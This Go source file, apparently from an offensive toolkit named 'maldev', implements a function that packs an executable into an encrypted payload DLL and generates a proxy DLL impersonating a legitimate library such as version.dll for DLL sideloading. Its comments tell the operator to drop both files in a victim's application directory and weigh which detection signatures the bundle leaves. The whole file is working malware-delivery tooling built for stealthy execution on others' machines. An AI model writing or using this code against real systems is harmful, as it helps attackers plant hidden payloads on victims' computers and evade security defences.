package packer

import (
	"fmt"

	"github.com/oioio-space/maldev/pe/dllproxy"
)

// ChainedProxyDLLOptions parameterises [PackChainedProxyDLL].
type ChainedProxyDLLOptions struct {
	// PackOpts tunes the inner [PackBinary] call that converts the
	// EXE input into a payload DLL. ConvertEXEtoDLL is FORCED to
	// true regardless of the caller-supplied value (operator
	// intent is unambiguous when calling this entry point).
	PackOpts PackBinaryOptions

	// TargetName is the legitimate DLL name whose exports the
	// proxy mirrors (e.g. "version" for version.dll).
	TargetName string

	// Exports is the list of exports to forward back to the
	// legitimate target. Use [pe/parse.Exports] to extract them
	// from a real DLL on the operator host.
	Exports []dllproxy.Export

	// PayloadDLLName is the filename the proxy will pass to
	// LoadLibraryA on DLL_PROCESS_ATTACH. Defaults to
	// "payload.dll" when empty. Drop the proxy + payload DLLs
	// in the same directory under the file names this resolves
	// to and {TargetName.dll, PayloadDLLName} both load.
	PayloadDLLName string

	// ProxyOpts forwards additional dllproxy.Options knobs
	// (PathScheme, DOSStub, PatchCheckSum). Machine + PayloadDLL
	// are overridden by this entry point — operator-supplied
	// values for those are ignored.
	ProxyOpts dllproxy.Options
}

// PackChainedProxyDLL emits the **two-file DLL sideloading bundle**
// (Path A from docs/refactor-2026-doc/packer-exe-to-dll-plan.md):
//
//  1. The EXE input is packed via [PackBinary] with
//     ConvertEXEtoDLL=true → a payload DLL that runs the original
//     EXE entry point on DLL_PROCESS_ATTACH.
//  2. A separate proxy DLL is emitted via
//     [github.com/oioio-space/maldev/pe/dllproxy.GenerateExt]
//     mirroring the target legitimate DLL's exports + carrying a
//     LoadLibraryA(opts.PayloadDLLName) call in its tiny DllMain.
//
// Drop {proxy DLL, payload DLL} side-by-side in the victim's
// app directory. The host EXE LoadLibrary's the proxy (named like
// the legit target — e.g. version.dll); the proxy's DllMain
// LoadLibraryA's the payload, which decrypts and spawns a thread
// at the original EXE's entry. The proxy then forwards every
// export call back to the real target via the perfect-dll-proxy
// absolute path scheme.
//
// Returns (proxyDLLBytes, payloadDLLBytes, key, err). Write each
// to disk under the right filename and ship both.
//
// Operational drawback (vs. the future fused Path B in slice 6):
// two-file drop + the proxy DLL has an IAT entry on
// kernel32!LoadLibraryA — a detectable IOC for kits that
// fingerprint proxy DLLs by their import set.
func PackChainedProxyDLL(input []byte, opts ChainedProxyDLLOptions) (proxy, payload, key []byte, err error) {
	if opts.TargetName == "" {
		return nil, nil, nil, fmt.Errorf("packer: ChainedProxyDLL TargetName required")
	}
	if len(opts.Exports) == 0 {
		return nil, nil, nil, fmt.Errorf("packer: ChainedProxyDLL Exports required")
	}
	payloadName := opts.PayloadDLLName
	if payloadName == "" {
		payloadName = "payload.dll"
	}

	// Step 1 — pack the EXE as a converted DLL.
	packOpts := opts.PackOpts
	packOpts.ConvertEXEtoDLL = true
	if packOpts.Format == FormatUnknown {
		packOpts.Format = FormatWindowsExe
	}
	payload, key, err = PackBinary(input, packOpts)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("packer: ChainedProxyDLL pack payload: %w", err)
	}

	// Step 2 — emit the proxy with PayloadDLL pointing at the
	// payload's filename. Override Machine + PayloadDLL —
	// these are non-negotiable for the chained shape.
	proxyOpts := opts.ProxyOpts
	proxyOpts.Machine = dllproxy.MachineAMD64
	proxyOpts.PayloadDLL = payloadName
	proxy, err = dllproxy.GenerateExt(opts.TargetName, opts.Exports, proxyOpts)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("packer: ChainedProxyDLL generate proxy: %w", err)
	}

	return proxy, payload, key, nil
}
